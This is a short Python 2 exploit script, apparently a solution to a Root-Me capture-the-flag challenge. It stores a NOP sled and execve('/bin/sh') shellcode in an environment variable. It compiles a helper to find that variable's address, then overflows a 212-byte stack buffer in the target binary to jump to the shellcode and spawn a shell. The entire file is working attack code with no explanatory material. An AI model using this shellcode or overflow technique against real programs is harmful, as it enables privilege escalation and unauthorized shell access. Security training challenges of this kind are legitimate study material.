#!/usr/bin/env python2
import struct
import os

# var env execve("/bin/sh")
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
os.environ['EGG'] = '\x90' * 100 + shellcode

# getaddr
os.system('gcc -m32 -o /tmp/getaddr -x c - << EOF\n#include <stdio.h>\n#include <stdlib.h>\nint main() { printf("%p\\n", getenv("EGG")); }\nEOF')

# dummy arg length of payload
offset = 212
dummy = 'A' * (offset + 4)
addr_str = os.popen('/tmp/getaddr "{}"'.format(dummy)).read().strip()
print("EGG address: " + addr_str)

egg_addr = int(addr_str, 16)

# build payload (start of NOPs)
payload = "A" * offset + struct.pack("<I", egg_addr)

print("Running exploit...")
os.system('./root-me-1 "' + payload + '"')
